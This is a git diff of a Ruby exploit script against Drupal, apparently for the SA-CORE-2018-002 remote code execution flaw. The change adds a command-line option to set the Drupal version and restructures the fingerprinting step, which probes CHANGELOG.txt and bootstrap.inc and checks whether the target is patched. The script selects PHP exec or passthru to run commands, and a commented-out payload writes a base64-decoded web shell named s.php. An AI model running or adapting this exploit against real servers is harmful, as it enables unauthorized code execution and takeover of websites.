@@ -50,61 +50,66 @@ end
 # evil = "echo " + Base64.strict_encode64(evil).strip + " | base64 -d | tee s.php"
 evil = 'echo Works!'
 
+# Try and get version
+drupalversion = if ARGV[1] then ARGV[1] else nil end
+
 # Feedback
 puts "[*] Target : #{target}"
 puts "[*] Payload: #{evil}"
-puts "-"*80
-
-
-# Try and get version
-drupalversion = nil
-# Possible URLs
-url = [
-  target + "CHANGELOG.txt",
-  target + "core/CHANGELOG.txt",
-  target + "includes/bootstrap.inc",
-  target + "core/includes/bootstrap.inc",
-]
-# Check all
-url.each do|uri|
-  exploit_uri = URI(uri)
-
-  # Check response
-  http = Net::HTTP.new(exploit_uri.host, exploit_uri.port, proxy_addr, proxy_port)
-  request = Net::HTTP::Get.new(exploit_uri.request_uri)
-  response = http.request(request)
-
-  if response.code == "200"
-    puts "[+] Found  : #{uri} (#{response.code})"
-    # Patched already?
-    puts "[!] WARNING: Might be patched! Found SA-CORE-2018-002: #{url}" if response.body.include? "SA-CORE-2018-002"
-
-    drupalversion = response.body.match(/Drupal (.*)[, ]/).to_s().slice(/Drupal (.*)[, ]/, 1).strip
-    puts "[+] Drupal!: #{drupalversion}"
-    # Done!
-    break
-  elsif response.code == "403"
-    puts "[+] Found  : #{uri} (#{response.code})"
-
-    drupalversion = uri.match(/core/)? '8.x' : '7.x'
-    puts "[+] Drupal?: #{drupalversion}"
-  else
-    puts "[!] MISSING: #{uri} (#{response.code})"
-  end
+if drupalversion
+  puts "[*] Drupal version: #{drupalversion}"
 end
+puts "-"*80
 
 if not drupalversion
-  puts "[!] Didn't detect Drupal version"
-  puts "[!] Forcing Drupal v8.x attack"
-  drupalversion = "8.x"
+  # Possible URLs
+  url = [
+    target + "CHANGELOG.txt",
+    target + "core/CHANGELOG.txt",
+    target + "includes/bootstrap.inc",
+    target + "core/includes/bootstrap.inc",
+  ]
+  # Check all
+  url.each do|uri|
+    exploit_uri = URI(uri)
+
+    # Check response
+    http = Net::HTTP.new(exploit_uri.host, exploit_uri.port, proxy_addr, proxy_port)
+    request = Net::HTTP::Get.new(exploit_uri.request_uri)
+    response = http.request(request)
+
+    if response.code == "200"
+      puts "[+] Found  : #{uri} (#{response.code})"
+      # Patched already?
+      puts "[!] WARNING: Might be patched! Found SA-CORE-2018-002: #{url}" if response.body.include? "SA-CORE-2018-002"
+
+      drupalversion = response.body.match(/Drupal (.*)[, ]/).to_s().slice(/Drupal (.*)[, ]/, 1).strip
+      puts "[+] Drupal!: #{drupalversion}"
+      # Done!
+      break
+    elsif response.code == "403"
+      puts "[+] Found  : #{uri} (#{response.code})"
+
+      drupalversion = uri.match(/core/)? '8.x' : '7.x'
+      puts "[+] Drupal?: #{drupalversion}"
+    else
+      puts "[!] MISSING: #{uri} (#{response.code})"
+    end
+  end
+
+  if not drupalversion
+    puts "[!] Didn't detect Drupal version"
+    puts "[!] Forcing Drupal v8.x attack"
+    drupalversion = "8.x"
+  end
+  puts "-"*80
 end
-puts "-"*80
 
 
 # PHP function to use (don't forget about disabled functions...)
 phpmethod = drupalversion.start_with?('8')? 'exec' : 'passthru'
-puts "[*] PHP cmd: #{phpmethod}"
-puts "-"*80
+# puts "[*] PHP cmd: #{phpmethod}"
+# puts "-"*80
 
 
 ## Check the version to match the payload
